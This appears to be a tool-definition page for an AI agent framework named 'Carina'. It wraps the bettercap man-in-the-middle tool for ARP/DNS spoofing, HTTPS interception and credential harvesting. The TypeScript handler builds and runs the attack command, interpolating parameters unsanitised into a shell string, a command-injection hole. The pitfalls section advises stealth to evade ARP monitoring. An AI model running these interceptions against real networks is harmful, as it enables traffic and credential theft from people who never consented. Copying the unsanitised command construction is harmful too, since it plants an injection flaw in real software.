# Tool: bettercap | #34 | MITM Framework

## Metadata
- **Priority:** HIGH; **Source:** Kali; **Binary:** `bettercap`; **Package:** `bettercap`
- **Risk:** high; **Approval:** yes; **OS:** kali, parrot

## Purpose
Modern MITM framework. ARP/DNS/DHCPv6 spoofing, HTTP/HTTPS transparent proxy, credential harvesting, session hijacking, WiFi network monitoring. Carina uses bettercap for network-level attacks and credential interception.

## Carina CLI Command
```
carina wireless mitm <interface> [--target <IP>] [--module arp.spoof|dns.spoof|http.proxy|https.proxy|wifi]
```

## TypeScript Wrapper

```typescript
export const bettercapTool: ToolDefinition = {
  name: 'bettercap_mitm',
  description: 'MITM framework; ARP/DNS spoofing, HTTP/HTTPS proxy, credential harvesting, WiFi.',
  parameters: {
    interface: { type: 'string', required: true },
    target: { type: 'string', description: 'Target IP or CIDR' },
    modules: { type: 'array', items: 'string', default: ['arp.spoof', 'net.sniff'] },
    gateway: { type: 'string', description: 'Gateway IP' },
    caplet: { type: 'string', description: 'Caplet script' },
  },
  requires: ['bettercap'],
  risk: 'high',
  category: 'wireless',
  requiresApproval: true,
  handler: async (params, ctx) => {
    await ctx.requestApproval('MITM attack; intercepts network traffic');
    let cmd = `bettercap -iface ${params.interface} -eval "`;
    cmd += `set arp.spoof.targets ${params.target || ''}; `;
    cmd += `set net.sniff.filter 'tcp port 80 or tcp port 443 or udp port 53'; `;
    params.modules.forEach(m => cmd += `${m} on; `);
    cmd += `net.sniff on"`;
    cmd += ` -no-colors -silent`;
    const result = await execSecure(cmd, { timeout: 300000 });
    return parseBettercapOutput(result.stdout);
  },
};
```

## Key Modules
| Module | Purpose |
|--------|---------|
| arp.spoof | ARP cache poisoning |
| dns.spoof | DNS response manipulation |
| http.proxy | HTTP transparent proxy |
| https.proxy | HTTPS with cert injection |
| net.sniff | Packet sniffing |
| wifi | WiFi scanning and attacks |
| events.stream | Event output |

## Pitfalls
1. **ARP spoofing detected**; many networks have ARP watch; use with stealth
2. **HTTPS warnings**; proxy causes certificate errors visible to users
3. **Network disruption**; ARP spoofing can break connectivity if misconfigured

## Verification
```bash
which bettercap && bettercap -version
bettercap -eval "help; q"
```
